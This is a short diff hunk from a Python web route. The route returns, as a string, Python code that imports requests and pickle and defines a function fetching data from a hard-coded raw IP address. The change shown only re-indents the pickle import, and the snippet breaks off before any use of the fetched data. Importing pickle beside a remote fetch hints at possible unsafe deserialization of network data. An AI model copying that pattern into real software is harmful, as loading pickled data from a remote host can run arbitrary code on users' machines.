@@ -14,8 +14,7 @@ def print(txt):
 @route('/')
 def hello():
     site = """import requests as req
-        import pickle
-
+    import pickle
             def get(URL = "http://167.71.35.239:8080/bridge"):
                     data = req.get(URL)
                     print(len(data.text))
